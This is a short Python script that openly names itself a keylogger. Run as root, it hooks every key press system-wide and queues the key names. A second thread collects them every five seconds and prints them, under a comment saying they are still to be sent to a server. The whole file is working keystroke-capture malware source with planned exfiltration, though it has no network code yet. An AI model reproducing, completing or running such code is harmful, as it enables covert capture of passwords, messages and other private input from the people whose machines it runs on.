import time

import keyboard
import threading

from queue import Queue

keys_pressed = Queue(maxsize=1024)


def on_key_press(event: keyboard.KeyboardEvent):
    # this has to be global
    global keys_pressed
    keys_pressed.put(event.name)


def start_keylogger():
    keyboard.on_press(callback=on_key_press)
    keyboard.wait()


def send_keys():
    # this doesn't have to be global
    global keys_pressed
    while threading.main_thread().is_alive():
        new_keys = []
        while not keys_pressed.empty():
            new_keys.append(keys_pressed.get())
        # todo: send to a server
        print(new_keys)
        time.sleep(5)


if __name__ == '__main__':
    # RUN THIS SCRIPT AS ROOT, BECAUSE OF THE KEYBOARD DEPENDENCY
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    sender_thread = threading.Thread(target=send_keys)
    sender_thread.start()

    keylogger_thread.join()
    sender_thread.join()
    # this is a comment right here